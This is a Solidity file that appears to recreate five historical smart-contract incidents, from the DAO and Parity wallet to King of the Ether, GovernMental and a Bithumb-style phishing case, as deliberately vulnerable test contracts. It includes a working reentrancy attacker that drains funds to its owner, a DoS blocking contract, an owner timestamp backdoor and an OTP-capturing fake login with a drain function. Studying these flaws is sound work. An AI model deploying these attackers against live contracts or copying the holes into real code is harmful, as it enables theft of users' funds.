// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

 1. THE DAO ATTACK (2016)

Description: Reentrancy vulnerability allowed attackers to recursively withdraw funds 
before balance was updated. This led to the infamous DAO exploit where ~$70M in ETH was stolen.
*/

contract TestDAO {
    mapping(address => uint256) public balances;

    function donate() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds");

        // Vulnerable external call before state update
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        // State update after call (bad practice)
        balances[msg.sender] -= amount;
    }

    fallback() external payable {}
    receive() external payable {}
}

contract TestDAOAttacker {
    TestDAO public dao;
    address public owner;

    constructor(address _dao) {
        dao = TestDAO(_dao);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        dao.donate{value: 1 ether}();
        dao.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw(1 ether);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}

/*

 2. PARITY WALLET ATTACK (2017)

Description: Unprotected `init()` function in a shared library allowed any user 
to become owner and call `selfdestruct()`, breaking ~500 multisig wallets, freezing $150M.
*/

contract TestLibrary {
    address public owner;

    // Unprotected initializer
    function init(address _owner) public {
        owner = _owner;
    }

    function kill() public {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

contract TestParityWallet {
    address public lib;
    address public owner;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    // Delegatecall proxy
    fallback() external payable {
        address _impl = lib;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/*

 3. KING OF THE ETHER THRONE (2016)

Description: DoS vulnerability where a malicious contract becomes king and 
refuses to accept Ether, blocking others from dethroning it.
*/

contract TestKingOfEther {
    address public king;
    uint public prize;

    constructor() payable {
        king = msg.sender;
        prize = msg.value;
    }

    function claimThrone() public payable {
        require(msg.value > prize, "Need to pay more");

        // Vulnerable call
        (bool sent, ) = payable(king).call{value: prize}("");
        require(sent, "Failed to pay previous king");

        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {}
}

// Attacker contract that blocks payment
contract BlockingReceiver {
    fallback() external payable {
        revert("Cannot receive Ether");
    }
}

/*

 4. GOVERNMENTAL (Ponzi)

Description: Ponzi game vulnerable to stack depth issues, timestamp manipulation,
and poor reset logic. Exploited to retain funds unfairly.
*/

contract TestGovernMental {
    address[] public participants;
    mapping(address => uint) public deposits;
    uint public lastParticipationTime;
    address public owner;

    constructor() {
        owner = msg.sender;
        lastParticipationTime = block.timestamp;
    }

    function join() public payable {
        require(msg.value >= 1 ether, "Min 1 ETH");
        deposits[msg.sender] += msg.value;
        participants.push(msg.sender);
        lastParticipationTime = block.timestamp;
    }

    function claim() public {
        require(block.timestamp > lastParticipationTime + 12 hours, "Too early");
        require(msg.sender == participants[participants.length - 1], "Not last");

        payable(msg.sender).transfer(address(this).balance);

        delete participants;
        lastParticipationTime = block.timestamp;
    }

    // Dangerous backdoor: timestamp manipulation
    function setTime(uint fakeTime) public {
        require(msg.sender == owner);
        assembly {
            sstore(lastParticipationTime.slot, fakeTime)
        }
    }

    receive() external payable {}
}

/*

 5. BITHUMB (Phishing Simulation)

Description: Simulates a phishing scam where fake login captures OTPs and 
grants attackers access to drain the contract.
*/

contract TestPhishingLogin {
    mapping(address => bool) public loggedIn;

    function fakeLogin(string memory otp) public {
        emit LoginAttempt(msg.sender, otp);
        loggedIn[msg.sender] = true;
    }

    function drain(address payable _to) public {
        require(loggedIn[msg.sender], "Not authenticated");
        _to.transfer(address(this).balance);
    }

    receive() external payable {}

    event LoginAttempt(address indexed user, string otp);
}
